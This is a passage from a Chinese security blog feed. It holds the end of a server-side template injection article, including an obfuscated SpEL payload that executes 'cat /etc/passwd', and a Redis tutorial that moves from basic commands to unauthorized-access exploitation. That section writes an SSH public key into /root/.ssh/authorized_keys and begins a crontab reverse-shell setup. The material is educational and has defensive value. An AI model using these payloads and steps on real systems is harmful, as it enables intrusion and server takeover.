class="hljs">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</code></pre><blockquote><p><strong>注意:</strong></p><p>这里面的 T()  是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p></blockquote><h2 id="0X07-防御方法"><a href="#0X07-防御方法" class="headerlink" title="0X07 防御方法"></a><strong>0X07 防御方法</strong></h2><p>(1)和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制<br>(2)减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法</p><h2 id="0X08-总结："><a href="#0X08-总结：" class="headerlink" title="0X08 总结："></a><strong>0X08 总结：</strong></h2><p>这篇文章对 SSTI 的介绍和分析就告一段落了，由于个人水平有限，篇幅有限，也无法将再多的细节呈现给大家，如果你能在读我的文章中有于读别人的文章不一样的收获，那将是我莫大的荣幸，如果没有那说明我的知识储备或者是表达能力还有所欠缺，我会在后面的文章中改进。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://portswigger.net/blog/server-side-template-injection">https://portswigger.net/blog/server-side-template-injection</a><br><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a><br><a href="http://www.freebuf.com/articles/system/97146.html">http://www.freebuf.com/articles/system/97146.html</a><br><a href="http://www.freebuf.com/articles/web/98619.html">http://www.freebuf.com/articles/web/98619.html</a><br><a href="https://secalert.net/#cve-2016-4977">https://secalert.net/#cve-2016-4977</a><br><a href="http://www.mamicode.com/info-detail-1304795.html">http://www.mamicode.com/info-detail-1304795.html</a><br><a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">https://freemarker.apache.org/docs/ref_builtins_expert.html</a><br><a href="http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/</a><br><a href="https://www.cnblogs.com/tyomcat/p/5440488.html">https://www.cnblogs.com/tyomcat/p/5440488.html</a><br><a href="http://deadpool.sh/2017/RCE-Springs/">http://deadpool.sh/2017/RCE-Springs/</a><br><a href="http://klaus.link/2017/Flask_SSTI/">http://klaus.link/2017/Flask_SSTI/</a><br><a href="https://www.cnblogs.com/zedosu/p/6518124.html">https://www.cnblogs.com/zedosu/p/6518124.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis 基础梳理以及其在渗透测试中的利用</title>
    <link href="/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/2018/11/08/Redis%20%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言："><a href="#0X00-前言：" class="headerlink" title="0X00 前言："></a><strong>0X00 前言：</strong></h2><p>之前一直说 NOSQL ，也看了不少文章对于未授权 NOSQL 的攻击案例，知道大致怎么用，但是自己一直没有尝试好好使用过，感觉对比 MYSQL 而言，我太轻视  NOSQL ，于是这次下定决心以 Redis 作为例子好好玩玩，特此记录备忘。</p><h2 id="0X01-简介"><a href="#0X01-简介" class="headerlink" title="0X01 简介"></a><strong>0X01 简介</strong></h2><p>我们知道 NOSQL 和 MYSQL 的差距还是非常大的，他不再是关系型数据库(也就是说他不在存在表这种东西)，那他是什么呢？实际上它是以键值对的形式存放数据的，很像 json 的形式，并且与关系型数据库相比 Redis 能存储的数据类型也多得多，它不仅能存储字符串型的数据，还能存储其他四种类型：list，set，zset(有序)，hash （就算是和同类 NOSQL 数据库 memcached 相比他也强大的多，因为 memcached 仅能支持比较单一的 key-value ），它支持数据在硬盘的持久化(EDB 快照或者是 AOF 的形式)，还有一个特点就是他的所有操作都是原子性的，也就是说要么成功执行，要么就完全不执行。</p><span id="more"></span><h2 id="0X02-小试牛刀"><a href="#0X02-小试牛刀" class="headerlink" title="0X02 小试牛刀"></a><strong>0X02 小试牛刀</strong></h2><h3 id="1-设置一个值并获取"><a href="#1-设置一个值并获取" class="headerlink" title="1.设置一个值并获取"></a><strong>1.设置一个值并获取</strong></h3><pre><code class="hljs">127.0.0.1:6379&gt; set mykey abcOK127.0.0.1:6379&gt; get mykey &quot;abc&quot;</code></pre><h3 id="2-查看配置并修改选项"><a href="#2-查看配置并修改选项" class="headerlink" title="2.查看配置并修改选项"></a><strong>2.查看配置并修改选项</strong></h3><pre><code class="hljs">config get xxx (如果是 * 表示获取全部)config set xxx yyy </code></pre><p><strong>注意：下面的配置项在我们的写 shell 的过程中比较有用</strong></p><p><strong>(1）获取 RDB 文件的存放位置</strong></p><pre><code class="hljs">config get dir</code></pre><p><strong>(2) 获取 RDB 文件的文件名(默认为dump.rdb)</strong></p><pre><code class="hljs">config get dbfilename </code></pre><p><strong>(3) 判断 AOF 是否开启</strong></p><pre><code class="hljs">config get appendonly</code></pre><p><strong>（4）获取 AOF 的文件名(默认appendonly.aof)</strong></p><pre><code class="hljs">config get appendfilename</code></pre><p><strong>(5)获取 AOF 文件的备份方式(always everysec no)</strong></p><pre><code class="hljs">config get appendfsync</code></pre><h2 id="0X03-数据类型"><a href="#0X03-数据类型" class="headerlink" title="0X03 数据类型"></a><strong>0X03 数据类型</strong></h2><h3 id="1-String-类型"><a href="#1-String-类型" class="headerlink" title="1.String 类型"></a><strong>1.String 类型</strong></h3><p>String 是最基本的类型，这个类型是二进制安全的，也就是说能存储任何类型的数据，比如说 jpg 图片或者序列化的对象，string 类型的值最大能存储 512MB。</p><pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3nOK127.0.0.1:6379&gt; get name&quot;K0rz3n&quot;127.0.0.1:6379&gt;</code></pre><h3 id="2-Hash-类型"><a href="#2-Hash-类型" class="headerlink" title="2.Hash 类型"></a><strong>2.Hash 类型</strong></h3><p><strong>应用场景：</strong></p><p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p><p><strong>实现方式：</strong></p><p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/hash%E7%BB%93%E6%9E%84.png" alt="此处输入图片的描述"></p><p><strong>常用命令：</strong></p><pre><code class="hljs">hget/hset/hgetall/hmset</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; hmset 1 name K0rz3n age 20OK127.0.0.1:6379&gt; hget 1 name&quot;K0rz3n&quot;127.0.0.1:6379&gt; hget 1 age&quot;20&quot;127.0.0.1:6379&gt;</code></pre><h3 id="3-List-类型"><a href="#3-List-类型" class="headerlink" title="3.List 类型"></a><strong>3.List 类型</strong></h3><p>Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）,本质上是一个双向链表，列表最多可存储 2的32次方 - 1 个元素</p><p><strong>应用场景：</strong></p><p>Redis list的应用场景非常多，也是Redis最重要的数据结构之一，比如twitter的关注列表，粉丝列表等都可以用Redis的list结构来实现；</p><p><strong>常用命令：</strong></p><pre><code class="hljs">lpush/rpush/lpop/rpop/lrange</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; lpush list K0rz3n(integer) 1127.0.0.1:6379&gt; lpush list name(integer) 2127.0.0.1:6379&gt; rpush list age(integer) 3127.0.0.1:6379&gt; lrange list 0 101) &quot;name&quot;2) &quot;K0rz3n&quot;3) &quot;age&quot;127.0.0.1:6379&gt;</code></pre><h3 id="4-Set-类型"><a href="#4-Set-类型" class="headerlink" title="4.Set 类型"></a><strong>4.Set 类型</strong></h3><p><strong>应用场景：</strong></p><p>Redis set对外提供的功能与list类似是一个列表的功能，特殊之处在于set是可以自动排重的，当你需要存储一个列表数据，又不希望出现重复数据时，set是一个很好的选择，并且set提供了判断某个成员是否在一个set集合内的重要接口，这个也是list所不能提供的；</p><p><strong>实现方式：</strong></p><p>set 的内部实现是一个 value永远为null的HashMap，实际就是通过计算hash的方式来快速排重的，这也是set能提供判断一个成员是否在集合内的原因。</p><p><strong>常用命令：</strong></p><pre><code class="hljs">sadd/spop/smembers/sunion</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; sadd set K0rz3n(integer) 1127.0.0.1:6379&gt; sadd set name(integer) 1127.0.0.1:6379&gt; sadd set age(integer) 1127.0.0.1:6379&gt; sadd set name(integer) 0127.0.0.1:6379&gt; smembers set1) &quot;age&quot;2) &quot;K0rz3n&quot;3) &quot;name&quot;</code></pre><h3 id="5-ZSet-Sorted-set-类型"><a href="#5-ZSet-Sorted-set-类型" class="headerlink" title="5.ZSet(Sorted set )类型"></a><strong>5.ZSet(Sorted set )类型</strong></h3><p><strong>应用场景：</strong></p><p>Redis sorted set的使用场景与set类似，区别是set不是自动有序的，而sorted set可以通过用户额外提供一个优先级(score)的参数来为成员排序，并且是插入有序的，即自动排序。当你需要一个有序的并且不重复的集合列表，那么可以选择sorted set数据结构，比如twitter 的public timeline可以以发表时间作为score来存储，这样获取时就是自动按时间排好序的。</p><p><strong>实现方式：</strong></p><p>Redis sorted set的内部使用HashMap和跳跃表(SkipList)来保证数据的存储和有序，HashMap里放的是成员到score的映射，而跳跃表里存放的是所有的成员，排序依据是HashMap里存的score,使用跳跃表的结构可以获得比较高的查找效率，并且在实现上比较简单。</p><p><strong>常用命令：</strong></p><pre><code class="hljs">zadd/zrange/zrem/zcard</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; zadd zset 0 K0rz3n(integer) 1127.0.0.1:6379&gt; zadd zset 0 name(integer) 1127.0.0.1:6379&gt; zadd zset 0 age(integer) 1127.0.0.1:6379&gt; zadd zset 0 name(integer) 0127.0.0.1:6379&gt; zrangebyscore zset 0 101) &quot;K0rz3n&quot;2) &quot;age&quot;3) &quot;name&quot;</code></pre><h2 id="0X04-Redis-常用命令"><a href="#0X04-Redis-常用命令" class="headerlink" title="0X04 Redis 常用命令"></a><strong>0X04 Redis 常用命令</strong></h2><h3 id="1-PING-命令"><a href="#1-PING-命令" class="headerlink" title="1.PING 命令"></a><strong>1.PING 命令</strong></h3><p>ping 命令查看是否连接 Redis 服务端成功</p><pre><code class="hljs">127.0.0.1:6379&gt; pingPONG</code></pre><h3 id="2-有关-key-的命令"><a href="#2-有关-key-的命令" class="headerlink" title="2.有关 key 的命令"></a><strong>2.有关 key 的命令</strong></h3><h4 id="1-del-删除键"><a href="#1-del-删除键" class="headerlink" title="1.del 删除键"></a><strong>1.del 删除键</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3nOK127.0.0.1:6379&gt; del name(integer) 1</code></pre><p>命令执行成功后输出 (integer) 1，否则将输出 (integer) 0</p><h4 id="2-dump-序列化键"><a href="#2-dump-序列化键" class="headerlink" title="2.dump 序列化键"></a><strong>2.dump 序列化键</strong></h4><p>dump 序列化给定的键，并返回序列化后的值</p><pre><code class="hljs">127.0.0.1:6379&gt; set name K0rz3nOK127.0.0.1:6379&gt; dump name&quot;\x00\x06K0rz3n\a\x00R\xb7\x87H^\xd5B\n&quot;</code></pre><h4 id="3-exists-检查键是否存在"><a href="#3-exists-检查键是否存在" class="headerlink" title="3.exists 检查键是否存在"></a><strong>3.exists 检查键是否存在</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; exists name(integer) 1</code></pre><h4 id="4-type-返回key-的存储类型"><a href="#4-type-返回key-的存储类型" class="headerlink" title="4.type 返回key 的存储类型"></a><strong>4.type 返回key 的存储类型</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; type namestring</code></pre><h4 id="5-keys-查找所有符合给定模式的-Key"><a href="#5-keys-查找所有符合给定模式的-Key" class="headerlink" title="5.keys 查找所有符合给定模式的 Key"></a><strong>5.keys 查找所有符合给定模式的 Key</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; keys n*1) &quot;naddfgfd&quot;2) &quot;naaaa&quot;3) &quot;name&quot;</code></pre><h3 id="2-有关-String-的命令"><a href="#2-有关-String-的命令" class="headerlink" title="2.有关 String 的命令"></a><strong>2.有关 String 的命令</strong></h3><h4 id="1-getrange-截取字符串"><a href="#1-getrange-截取字符串" class="headerlink" title="1.getrange 截取字符串"></a><strong>1.getrange 截取字符串</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; getrange name 0 2&quot;K0r&quot;</code></pre><h4 id="2-strlen-返回-key-存储的字符串的长度"><a href="#2-strlen-返回-key-存储的字符串的长度" class="headerlink" title="2.strlen 返回 key 存储的字符串的长度"></a><strong>2.strlen 返回 key 存储的字符串的长度</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; strlen name(integer) 6</code></pre><h4 id="3-append-追加字符串"><a href="#3-append-追加字符串" class="headerlink" title="3.append 追加字符串"></a><strong>3.append 追加字符串</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; append name _is_not_a_hacker(integer) 22127.0.0.1:6379&gt; get name&quot;K0rz3n_is_not_a_hacker&quot;</code></pre><h4 id="4-mget-获取所有给定的-Key-的值"><a href="#4-mget-获取所有给定的-Key-的值" class="headerlink" title="4.mget 获取所有给定的 Key 的值"></a><strong>4.mget 获取所有给定的 Key 的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; mget name mykey1) &quot;K0rz3n_is_not_a_hacker&quot;2) &quot;abc&quot;</code></pre><h4 id="5-mset-设置一个或者多个-key-value"><a href="#5-mset-设置一个或者多个-key-value" class="headerlink" title="5.mset 设置一个或者多个 key-value"></a><strong>5.mset 设置一个或者多个 key-value</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; mset name xiaoqiang age 20OK127.0.0.1:6379&gt; mget name age1) &quot;xiaoqiang&quot;2) &quot;20&quot;</code></pre><h3 id="3-有关-Hash-的命令"><a href="#3-有关-Hash-的命令" class="headerlink" title="3.有关 Hash 的命令"></a><strong>3.有关 Hash 的命令</strong></h3><h4 id="1-hmset-设置一个或者多个-field-value"><a href="#1-hmset-设置一个或者多个-field-value" class="headerlink" title="1.hmset 设置一个或者多个 field-value"></a><strong>1.hmset 设置一个或者多个 field-value</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hmset people name K0rz3n age 20 school xdOK</code></pre><h4 id="2-hgetall-获取给定键值的-hash-表内容"><a href="#2-hgetall-获取给定键值的-hash-表内容" class="headerlink" title="2.hgetall 获取给定键值的 hash 表内容"></a><strong>2.hgetall 获取给定键值的 hash 表内容</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hgetall people1) &quot;name&quot;2) &quot;K0rz3n&quot;3) &quot;age&quot;4) &quot;20&quot;5) &quot;school&quot;6) &quot;xd&quot;</code></pre><h4 id="3-hexists-判断指定的-field-是否存在"><a href="#3-hexists-判断指定的-field-是否存在" class="headerlink" title="3.hexists 判断指定的 field 是否存在"></a><strong>3.hexists 判断指定的 field 是否存在</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hexists people name(integer) 1127.0.0.1:6379&gt; hexists people hh(integer) 0</code></pre><h4 id="4-hget-获取指定-field-的值"><a href="#4-hget-获取指定-field-的值" class="headerlink" title="4.hget 获取指定 field 的值"></a><strong>4.hget 获取指定 field 的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hget people name&quot;K0rz3n&quot;</code></pre><h4 id="5-hlen-获取-hash-表中字段的数量"><a href="#5-hlen-获取-hash-表中字段的数量" class="headerlink" title="5.hlen 获取 hash 表中字段的数量"></a><strong>5.hlen 获取 hash 表中字段的数量</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hlen people(integer) 3</code></pre><h4 id="6-hkeys-获取所有的键值"><a href="#6-hkeys-获取所有的键值" class="headerlink" title="6.hkeys 获取所有的键值"></a><strong>6.hkeys 获取所有的键值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hkeys people1) &quot;name&quot;2) &quot;age&quot;3) &quot;school&quot;</code></pre><h4 id="7-hvals-获取所有的值"><a href="#7-hvals-获取所有的值" class="headerlink" title="7.hvals 获取所有的值"></a><strong>7.hvals 获取所有的值</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; hvals people1) &quot;K0rz3n&quot;2) &quot;20&quot;3) &quot;xd&quot;</code></pre><h3 id="4-有关-List-的命令"><a href="#4-有关-List-的命令" class="headerlink" title="4.有关 List 的命令"></a><strong>4.有关 List 的命令</strong></h3><h4 id="1-llen-获取列表的长度"><a href="#1-llen-获取列表的长度" class="headerlink" title="1.llen 获取列表的长度"></a><strong>1.llen 获取列表的长度</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; llen list(integer) 3</code></pre><h4 id="2-lindex-通过索引获取列表中的元素"><a href="#2-lindex-通过索引获取列表中的元素" class="headerlink" title="2.lindex 通过索引获取列表中的元素"></a><strong>2.lindex 通过索引获取列表中的元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lindex list 1&quot;K0rz3n&quot;127.0.0.1:6379&gt; lindex list 0&quot;name&quot;127.0.0.1:6379&gt; lindex list 2&quot;age&quot;</code></pre><h4 id="3-lrange-获取列表指定范围内的元素"><a href="#3-lrange-获取列表指定范围内的元素" class="headerlink" title="3.lrange 获取列表指定范围内的元素"></a><strong>3.lrange 获取列表指定范围内的元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lrange list 0 21) &quot;name&quot;2) &quot;K0rz3n&quot;3) &quot;age&quot;</code></pre><h4 id="4-linster-在元素的前或后插入元素"><a href="#4-linster-在元素的前或后插入元素" class="headerlink" title="4.linster 在元素的前或后插入元素"></a><strong>4.linster 在元素的前或后插入元素</strong></h4><p><strong>在前方插入</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; linsert list before name new_name(integer) 4127.0.0.1:6379&gt; lrange list 0 31) &quot;new_name&quot;2) &quot;name&quot;3) &quot;K0rz3n&quot;4) &quot;age&quot;</code></pre><p><strong>在后方插入</strong></p><pre><code class="hljs">127.0.0.1:6379&gt; linsert list after name old_name(integer) 5127.0.0.1:6379&gt; lrange list 0 41) &quot;new_name&quot;2) &quot;name&quot;3) &quot;old_name&quot;4) &quot;K0rz3n&quot;5) &quot;age&quot;</code></pre><h4 id="5-lpush-将一个或者多个值插入列表头部"><a href="#5-lpush-将一个或者多个值插入列表头部" class="headerlink" title="5.lpush 将一个或者多个值插入列表头部"></a><strong>5.lpush 将一个或者多个值插入列表头部</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lpush list hh(integer) 6127.0.0.1:6379&gt; lrange list 0 51) &quot;hh&quot;2) &quot;new_name&quot;3) &quot;name&quot;4) &quot;old_name&quot;5) &quot;K0rz3n&quot;6) &quot;age&quot;</code></pre><h4 id="6-lpop-移除并获取列表第一个元素"><a href="#6-lpop-移除并获取列表第一个元素" class="headerlink" title="6.lpop 移除并获取列表第一个元素"></a><strong>6.lpop 移除并获取列表第一个元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; lpop list&quot;hh&quot;127.0.0.1:6379&gt; lrange list 0 101) &quot;new_name&quot;2) &quot;name&quot;3) &quot;old_name&quot;4) &quot;K0rz3n&quot;5) &quot;age&quot;</code></pre><h4 id="7-rpush-将一个或者多个值插入列表尾部"><a href="#7-rpush-将一个或者多个值插入列表尾部" class="headerlink" title="7.rpush 将一个或者多个值插入列表尾部"></a><strong>7.rpush 将一个或者多个值插入列表尾部</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; rpush list hh(integer) 6127.0.0.1:6379&gt; lrange list 0 101) &quot;new_name&quot;2) &quot;name&quot;3) &quot;old_name&quot;4) &quot;K0rz3n&quot;5) &quot;age&quot;6) &quot;hh&quot;</code></pre><h4 id="8-rpop-移除并获取列表最后一个元素"><a href="#8-rpop-移除并获取列表最后一个元素" class="headerlink" title="8.rpop 移除并获取列表最后一个元素"></a><strong>8.rpop 移除并获取列表最后一个元素</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; rpop list&quot;hh&quot;127.0.0.1:6379&gt; lrange list 0 101) &quot;new_name&quot;2) &quot;name&quot;3) &quot;old_name&quot;4) &quot;K0rz3n&quot;5) &quot;age&quot;</code></pre><h3 id="5-有关-Set-的命令"><a href="#5-有关-Set-的命令" class="headerlink" title="5.有关 Set 的命令"></a><strong>5.有关 Set 的命令</strong></h3><h4 id="1-sadd-向集合中添加一个或者多个成员"><a href="#1-sadd-向集合中添加一个或者多个成员" class="headerlink" title="1.sadd 向集合中添加一个或者多个成员"></a><strong>1.sadd 向集合中添加一个或者多个成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; sadd set1 K0rz3n new old age(integer) 4</code></pre><h4 id="2-scard-返回集合的成员数"><a href="#2-scard-返回集合的成员数" class="headerlink" title="2.scard 返回集合的成员数"></a><strong>2.scard 返回集合的成员数</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; scard set1(integer) 4</code></pre><h4 id="3-smembers-返回集合的所有成员"><a href="#3-smembers-返回集合的所有成员" class="headerlink" title="3.smembers 返回集合的所有成员"></a><strong>3.smembers 返回集合的所有成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; smembers set11) &quot;new&quot;2) &quot;age&quot;3) &quot;old&quot;4) &quot;K0rz3n&quot;</code></pre><h4 id="4-sismember-判断是否是集合的成员"><a href="#4-sismember-判断是否是集合的成员" class="headerlink" title="4.sismember 判断是否是集合的成员"></a><strong>4.sismember 判断是否是集合的成员</strong></h4><pre><code class="hljs">127.0.0.1:6379&gt; sismember set1 age(integer) 1127.0.0.1:6379&gt; sismember set1 hh(integer) 0</code></pre><h2 id="0X05-数据的备份与恢复"><a href="#0X05-数据的备份与恢复" class="headerlink" title="0X05 数据的备份与恢复"></a><strong>0X05 数据的备份与恢复</strong></h2><p>Redis SAVE 命令用于创建当前数据库的备份。</p><p>直接在命令行输入 save 就能在 config dir 指定的目录中创建一个 dump.rdb 文件</p><blockquote><p><strong>注意：</strong></p><p>创建 redis 备份文件也可以使用命令 BGSAVE，该命令在后台执行。</p></blockquote><h2 id="0X06-Redis-在渗透测试中的利用"><a href="#0X06-Redis-在渗透测试中的利用" class="headerlink" title="0X06 Redis 在渗透测试中的利用"></a><strong>0X06 Redis 在渗透测试中的利用</strong></h2><h3 id="1-Redis-未授权访问："><a href="#1-Redis-未授权访问：" class="headerlink" title="1.Redis 未授权访问："></a><strong>1.Redis 未授权访问：</strong></h3><h4 id="1-漏洞描述："><a href="#1-漏洞描述：" class="headerlink" title="1.漏洞描述："></a><strong>1.漏洞描述：</strong></h4><p>在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。部分 Redis 绑定在 0.0.0.0:6379，并且没有开启密码认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p><h4 id="2-利用-Redis-获取敏感信息"><a href="#2-利用-Redis-获取敏感信息" class="headerlink" title="2.利用 Redis 获取敏感信息"></a><strong>2.利用 Redis 获取敏感信息</strong></h4><h5 id="1-Info"><a href="#1-Info" class="headerlink" title="(1)Info"></a><strong>(1)Info</strong></h5><p>如果 Redis 未授权访问成功(默认是空口令)，我们就能直接使用 Info 命令获取 Redis 以及系统的信息</p><p><strong>如题所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E4%BF%A1%E6%81%AF.png" alt="此处输入图片的描述"></p><h5 id="2-keys-get-key"><a href="#2-keys-get-key" class="headerlink" title="(2)keys * &#x2F; get key"></a><strong>(2)keys * &#x2F; get key</strong></h5><p>我们能获取所有的键以及对应的值（使用 keys *  和  get key 命令）</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/key%20%E4%BF%A1%E6%81%AF.png" alt="此处输入图片的描述"></p><h4 id="3-写公钥直接-ssh-连接"><a href="#3-写公钥直接-ssh-连接" class="headerlink" title="3.写公钥直接 ssh 连接"></a><strong>3.写公钥直接 ssh 连接</strong></h4><h5 id="1-原理分析："><a href="#1-原理分析：" class="headerlink" title="1.原理分析："></a><strong>1.原理分析：</strong></h5><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的&#x2F;root&#x2F;.ssh下生一个授权的key。</p><h5 id="2-大致的流程图如下"><a href="#2-大致的流程图如下" class="headerlink" title="2.大致的流程图如下"></a><strong>2.大致的流程图如下</strong></h5><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/redis%20%E5%86%99%E5%85%AC%E9%92%A51.png" alt="此处输入图片的描述"></p><h5 id="2-测试开始："><a href="#2-测试开始：" class="headerlink" title="2.测试开始："></a><strong>2.测试开始：</strong></h5><p>我在我的 vps 上开放了一个 docker 配置 redis 为未授权访问状态，将 docker 的 22 端口映射为 Vps 的 20002 端口，docker 的 6379 端口映射为 60009 端口</p><p><strong>1.首先在本地生成 ssh 公私钥</strong></p><pre><code class="hljs">ssh-keygen -t rsa</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5%E5%AF%B9.png" alt="此处输入图片的描述"></p><p><strong>2.将公钥导出为一个文件</strong></p><pre><code class="hljs">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</code></pre><p>这里的换行符是防止密钥数据和其他的 redis 缓存数据混合</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%AF%BC%E5%87%BA%E4%B8%BA%E6%96%87%E4%BB%B6.png" alt="此处输入图片的描述"></p><p><strong>3.访问 redis 的同时将某个键的值设置为文件的内容</strong></p><pre><code class="hljs">cat /root/.ssh/key.txt | ./redis-cli -h xxx.xxx.xxx.xxx -p 60009 -x set xxx</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E9%94%AE%E5%80%BC.png" alt="此处输入图片的描述"></p><p><strong>4.改变 redis 的 RDB 目录以及文件为 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</strong></p><pre><code class="hljs">config set dir /root/.sshconfig set dbfilename authorized_keys</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%94%B9%E5%8F%98%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84.png" alt="此处输入图片的描述"></p><p>并且我们可以看到我们的 key.txt 已经存储在了 键为 hacker 的字符串 value 里面</p><p><strong>5.将缓存数据(key.txt 和其他的一些 redis 本身的缓存)写入磁盘文件</strong></p><pre><code class="hljs">save</code></pre><p><strong>6.成功无密码登录 docker</strong></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%88%90%E5%8A%9F%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5.png" alt="此处输入图片的描述"></p><p><strong>7.我们看一下写入的文件的内容</strong></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9.png" alt="此处输入图片的描述"></p><h4 id="4-利用-crontable-反弹shell"><a href="#4-利用-crontable-反弹shell" class="headerlink" title="4.利用 crontable 反弹shell"></a><strong>4.利用 crontable 反弹shell</strong></h4><p>这个利用和上面的利用是一样的方法只不过是换了一下写入文件的路径以及写进去的内容</p><h5 id="1-端口监听"><a href="#1-端口监听" class="headerlink" title="1.端口监听"></a><strong>1.端口监听</strong></h5><p>我先在我另一台 vps 上监听 9999 端口</p><pre><code class="hljs">nc -lvv 9999</code></pre><p><strong>如图所示：</strong></p><p><img 